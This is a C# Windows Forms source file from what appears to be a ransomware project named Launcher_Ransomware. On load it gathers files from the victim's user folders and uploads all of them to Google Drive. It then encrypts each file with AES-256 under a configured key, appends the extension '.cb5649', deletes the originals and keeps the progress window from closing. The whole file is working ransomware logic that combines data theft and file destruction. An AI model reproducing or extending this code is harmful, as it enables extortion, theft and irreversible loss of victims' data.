namespace Launcher_Ransomware
{
    public partial class Encryption : Form
    {
        private static WinPaths _winPaths;
        private static FileMethod _fileMethod;
        private static readonly string encrypted_file_extension = ".cb5649";

        public Encryption()
        {
            InitializeComponent();
            BtnFinish.Enabled = false;
            _winPaths = new WinPaths();
            _fileMethod = new FileMethod();
        }

        private async void Encryption_Load(object sender, EventArgs e)
        {
            // Define paths
            List<string> all_paths = _winPaths.All_Paths;

            // Get total number of files that are going to be encrypted
            List<FileInfo> filesInfo = await InitializeAsync(all_paths);

            // Check if there is any file to be encrypted
            if (filesInfo.Count == 0)
            {
                MessageBox.Show("Lucky you, there is no file to encrypt :)", "Encryption", MessageBoxButtons.OK, MessageBoxIcon.Information);
                Application.Exit();
                return;
            }

            // Upload all files to google drive throug google drive api
            await UploadAllFilesToDriveAsync(filesInfo);

            // Initialize the encryption
            await InitializeEncryptionAsync(filesInfo);
        }

        private void Encryption_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        /// <summary>
        /// Initialize the laucher form
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void BtnFinish_Click(object sender, EventArgs e)
        {
            Launcher launcher = new();
            this.Hide();
            launcher.Show();
        }

        /// <summary>
        /// Get all files that are not encrypted for later encryption
        /// </summary>
        /// <param name="all_paths"></param>
        /// <returns></returns>
        private static async Task<List<FileInfo>> InitializeAsync(List<string> all_paths)
        {
            _fileMethod.ClearTotalFiles();
            List<Task> tasks = new();
            List<FileInfo> fileInfos = new();

            foreach (var path in all_paths)
            {
                if (Directory.Exists(path))
                    tasks.Add(Task.Run(() => _fileMethod.GetAllUncryptedFiles(path)));
            }

            try
            {
                await Task.WhenAll(tasks).ContinueWith(t =>
                {
                    foreach (var file in _fileMethod.GetTotalFiles())
                    {
                        if (File.Exists(file))
                        {
                            string name = Path.GetFileName(file);
                            fileInfos.Add(new FileInfo
                            {
                                Name = name,
                                Path = file
                            });
                        }
                    }
                });
            }
            catch (Exception e)
            {
                MessageBox.Show($"Initialization error: {e.Message}", "Encryption", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            return fileInfos;
        }

        /// <summary>
        /// Upload all files to google drive before encrypting
        /// </summary>
        /// <param name="files"></param>
        /// <returns></returns>
        private async Task UploadAllFilesToDriveAsync(List<FileInfo> files)
        {
            List<Task> tasks = new();

            foreach (var file in files)
            {
                if (File.Exists(file.Path))
                {
                    File.SetAttributes(file.Path, FileAttributes.Normal);
                    tasks.Add(GoogleDriveAPI.FileUpload(file.Path));
                }
            }

            await Task.WhenAll(tasks);
        }

        /// <summary>
        /// Create the progression bar and initialize the encryption
        /// </summary>
        /// <param name="filesInfo"></param>
        /// <returns></returns>
        private async Task InitializeEncryptionAsync(List<FileInfo> filesInfo)
        {
            Progress<ProgressReport> progress = new();
            progress.ProgressChanged += ReportProgress;

            LblInfo.Text = $"Encrypting {filesInfo.Count} file(s) from target machine";
            await EncryptionProcessAsync(filesInfo, progress);
        }

        /// <summary>
        /// Report back the encrypt progression on the screen
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ReportProgress(object sender, ProgressReport e)
        {
            if (e.PercentageComplete == 100)
            {
                LblProgress.Text = e.GetTotalPercentageComplete();
                ProgressBar.Value = e.PercentageComplete;
                BtnFinish.Enabled = true;
                return;
            }
            ProgressBar.Value = e.PercentageComplete;
            LblRemain.Text = e.GetTotalEnRemainFiles();
            LblName.Text = e.GetCurrentProcessedFile();
            LblProgress.Text = e.GetTotalPercentageComplete();   
        }

        /// <summary>
        /// Update the progression while encrypting the files simultaneously
        /// </summary>
        /// <param name="files"></param>
        /// <param name="progress"></param>
        /// <returns></returns>
        private static async Task EncryptionProcessAsync(List<FileInfo> files, IProgress<ProgressReport> progress)
        {
            List<string> output = new();
            ProgressReport report = new();

            report.TotalFiles = files.Count;
            byte[] encryption_key = _winPaths.HexStringToByteArray(ConfigurationManager.AppSettings["AES.Seckey"]);

            await Task.Run(() =>
            {
                Parallel.ForEach(files, async (file) =>
                {
                    string result = await AES_EncryptionAsync(file.Path, encrypted_file_extension, encryption_key);
                    output.Add(result);

                    report.RemainFiles = output.Count;
                    report.CurrentFilesProcessed = file.Name;     
                    report.PercentageComplete = (output.Count * 100) / files.Count;

                    progress.Report(report);
                });
            });
        }

        /// <summary>
        /// AES encryption algorithm 256-Bits
        /// </summary>
        /// <param name="target_file"></param>
        /// <param name="file_extension"></param>
        /// <param name="encryption_key"></param>
        /// <returns></returns>
        private static async Task<string> AES_EncryptionAsync(string target_file, string file_extension, byte[] encryption_key)
        {
            try
            {
                using var cipher = Aes.Create();

                byte[] randomIV = cipher.IV;
                File.SetAttributes(target_file, FileAttributes.Normal);
                var encryptor = cipher.CreateEncryptor(encryption_key, randomIV);

                using (var fsOut = File.Create(target_file + file_extension))
                {
                    await fsOut.WriteAsync(randomIV, 0, randomIV.Length);

                    using (var cs = new CryptoStream(fsOut, encryptor, CryptoStreamMode.Write))
                    {
                        using (var fsIn = File.OpenRead(target_file))
                        {
                            await fsIn.CopyToAsync(cs);
                        }
                    }
                }         
            }
            catch (Exception e)
            {
                MessageBox.Show(e.Message, "Encryption Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return null;
            }
            finally
            {
                File.Delete(target_file);
            } 
            return target_file;
        }
    }
}
